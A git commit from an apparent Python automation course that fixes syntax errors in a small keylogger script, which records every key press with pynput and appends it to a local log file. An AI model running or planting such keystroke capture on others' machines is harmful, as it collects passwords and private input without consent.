bf1a5aef19203536bd21980f0729f9039bc741f5
Antonio Pedro Kalenga <akalenga@c3r3s1.42luanda.com>
2025-08-28 22:38:36 +0100

    key loger  teste em python

--- Automação_com_Python/projectos_integrador_reais/keylogger.py
+++ Automação_com_Python/projectos_integrador_reais/keylogger.py
@@ -1,8 +1,8 @@
-import pynput.keyborad import Listener
+from pynput.keyboard import Listener
 
 def capturar_tecla(tecla):
 	with open("log.txt", 'a') as f:
 		f.write(f"{tecla}\n");
 
-with Listener(on_press==escrever) as l:
+with Listener(on_press=capturar_tecla) as l:
 	l.join()
